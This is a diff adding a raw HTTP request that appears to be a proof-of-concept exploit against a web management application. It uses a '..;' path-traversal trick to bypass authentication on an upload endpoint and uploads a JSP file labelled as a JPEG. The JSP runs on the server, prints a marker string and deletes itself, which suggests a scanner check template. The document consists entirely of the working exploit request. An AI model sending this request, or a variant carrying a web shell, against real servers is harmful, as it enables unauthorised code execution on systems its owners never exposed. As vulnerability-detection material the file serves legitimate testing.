@@ -1,0 +1,12 @@
+POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabcxyzqw
+Content-Length: 
+
+------WebKitFormBoundaryabcxyzqw
+Content-Disposition: form-data; name="file"; filename="testaa.jsp"
+Content-Type: image/jpeg
+
+<% out.println("asdfqwerzxcvbnmlkjhgtyuipoiuytre"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+------WebKitFormBoundaryabcxyzqw--
